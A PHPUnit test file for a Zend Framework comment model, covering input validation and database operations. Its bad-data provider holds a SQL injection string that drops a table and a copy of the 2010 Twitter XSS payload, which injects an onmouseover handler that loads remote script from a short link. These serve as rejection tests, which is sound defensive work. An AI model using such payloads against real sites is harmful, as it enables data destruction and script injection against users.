<?php
class Application_Model_CommentTest extends Zend_Test_PHPUnit_DatabaseTestCase
{
    protected $_comment;
    protected $_dbMock;
    
    protected function setUp()
    {
        $this->_comment = new Application_Model_Comment();
        parent::setUp();
    }
    protected function tearDown()
    {
        parent::tearDown();
        $this->_comment = null;
    }
    
    public function testModelIsEmptyAtConstruct()
    {
        $this->assertSame(0, $this->_comment->getId());
        $this->assertNull($this->_comment->getFullName());
        $this->assertNull($this->_comment->getEmailAddress());
        $this->assertNull($this->_comment->getWebsite());
        $this->assertNull($this->_comment->getComment());
    }
    public function goodData()
    {
        return array (
            array ('John Doe', 'john.doe@example.com', 
                   'http://example.com', 'test comment'),
            array ("Matthew Weier O'Phinney", 'matthew@zend.com', 
                   'http://weierophinney.net', 'Doing an MWOP-Test'),
            array ('D. Keith Casey, Jr.', 'Keith@CaseySoftware.com', 
                   'http://caseysoftware.com', 'Doing a monkey dance'),
        );
    }
    /**
     * @dataProvider goodData
     */
    public function testModelAcceptsValidData($name, $mail, $web, $comment)
    {
        $data = array (
            'fullName' => $name, 'emailAddress' => $mail, 'website' => $web, 'comment' => $comment,
        );
        try {
            $this->_comment->populate($data);
        } catch (Zend_Exception $e) {
            $this->fail('Unexpected exception should not be triggered');
        }
        $data['id'] = 0;
        $data['emailAddress'] = strtolower($data['emailAddress']);
        $data['website'] = strtolower($data['website']);
        $this->assertEquals($data, $this->_comment->toArray());
    }
    public function badData()
    {
        return array (
            array ('','','',''),
            array ("Robert'; DROP TABLES comments; --", '', 'http://xkcd.com/327/','Little Bobby Tables'),
            array (str_repeat('x', 1000), '', '', ''),
            array ('John Doe', 'jd@example.com', "http://t.co/@\"style=\"font-size:999999999999px;\"onmouseover=\"$.getScript('http:\u002f\u002fis.gd\u002ffl9A7')\"/", 'exploit twitter 9/21/2010'),
        );
    }
	/**
     * @dataProvider badData
     */
    public function testModelRejectsBadData($name, $mail, $web, $comment)
    {
        $data = array (
            'fullName' => $name, 'emailAddress' => $mail, 'website' => $web, 'comment' => $comment,
        );
        try {
            $this->_comment->populate($data);
        } catch (Zend_Exception $e) {
            return;
        }
        $this->fail('Expected exception should be triggered');
        
    }
    
    /*** DATABASE TESTING ***/
    
    public function getConnection()
    {
        if (null === $this->_dbMock) {
            $this->bootstrap = new Zend_Application(
                APPLICATION_ENV, APPLICATION_PATH . '/configs/application.ini');
            $this->bootstrap->bootstrap('db');
            $db = $this->bootstrap->getBootstrap()->getResource('db');
            $this->_connectionMock = $this->createZendDbConnection(
                $db, 'zftest'
            );
            return $this->_connectionMock;
        }
    }
    
    public function getDataSet()
    {
        return $this->createFlatXmlDataSet(
            realpath(APPLICATION_PATH . '/../tests/_files/initialDataSet.xml'));
    }
    
    public function testDatabaseCanBeRead()
    {
        $ds = new Zend_Test_PHPUnit_Db_DataSet_QueryDataSet(
            $this->getConnection());
        $ds->addTable('comment', 'SELECT * FROM `comment`');
        
        $expected = $this->createFlatXMLDataSet(
            APPLICATION_PATH . '/../tests/_files/selectDataSet.xml');
        $this->assertDataSetsEqual($expected, $ds);
    }
    public function testDatabaseCanBeUpdated()
    {
        $comment = new Application_Model_Comment();
        $mapper = new Application_Model_CommentMapper();
        $mapper->find(1, $comment);
        $comment->setComment('I like you picking up the challenge!');
        $mapper->save($comment);
        
        $ds = new Zend_Test_PHPUnit_Db_DataSet_QueryDataSet(
            $this->getConnection());
        $ds->addTable('comment', 'SELECT * FROM `comment`');
        
        $expected = $this->createFlatXMLDataSet(
            APPLICATION_PATH . '/../tests/_files/updateDataSet.xml');
        $this->assertDataSetsEqual($expected, $ds);
    }
    public function testDatabaseCanAddAComment()
    {
        $comment = new Application_Model_Comment();
        $comment->setFullName('Michelangelo van Dam')
                ->setEmailAddress('dragonbe@gmail.com')
                ->setWebsite('http://www.dragonbe.com')
                ->setComment('Unit Testing, It is so addictive!!!');
        $mapper = new Application_Model_CommentMapper();
        $mapper->save($comment);
        
        $ds = new Zend_Test_PHPUnit_Db_DataSet_QueryDataSet(
            $this->getConnection());
        $ds->addTable('comment', 'SELECT * FROM `comment`');
        $filteredDs = new PHPUnit_Extensions_Database_DataSet_DataSetFilter(
            $ds, array ('comment' => array ('id')));
        
        $expected = $this->createFlatXMLDataSet(
            APPLICATION_PATH . '/../tests/_files/addDataSet.xml');
        $this->assertDataSetsEqual($expected, $filteredDs);
    }
    public function testDatabaseCanDeleteAComment()
    {
        $comment = new Application_Model_Comment();
        $mapper = new Application_Model_CommentMapper();
        $mapper->find(1, $comment)
               ->delete($comment);
        $ds = new Zend_Test_PHPUnit_Db_DataSet_QueryDataSet(
            $this->getConnection());
        $ds->addTable('comment', 'SELECT * FROM `comment`');
        
        $expected = $this->createFlatXMLDataSet(
            APPLICATION_PATH . '/../tests/_files/deleteDataSet.xml');
        $this->assertDataSetsEqual($expected, $ds);
    }
}
